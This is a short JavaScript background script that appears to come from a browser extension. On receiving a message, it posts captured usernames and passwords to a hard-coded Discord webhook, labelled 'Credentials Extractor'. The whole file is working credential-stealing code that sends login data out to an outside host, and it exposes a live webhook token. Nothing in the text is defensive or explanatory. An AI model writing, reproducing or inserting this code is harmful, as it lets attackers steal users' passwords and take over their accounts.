const WEBHOOK_URL = "https://discord.com/api/webhooks/1225060606063935509/kDQLU38WyUI8u6Eds-ARvIKk4IEIT_SjZUAd8QjaVguIBTVxXaV7fTZOfZZ44-nmbxS6"; 

chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
    if (message.action === "sendCredentials") {
        sendCredentialsToWebhook(message.credentials.username, message.credentials.password);
    }
});

function sendCredentialsToWebhook(username, password) {
    fetch(WEBHOOK_URL, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            "content": "Login Credentials Extracted",
            "embeds": [
                {
                    "title": "Credentials",
                    "description": `**Username:** ${username}\n**Password:** ${password}`,
                    "color": null,
                }
            ],
            "username": "Credentials Extractor",
            "avatar_url": "",
            "attachments": []
        }),
    });
}
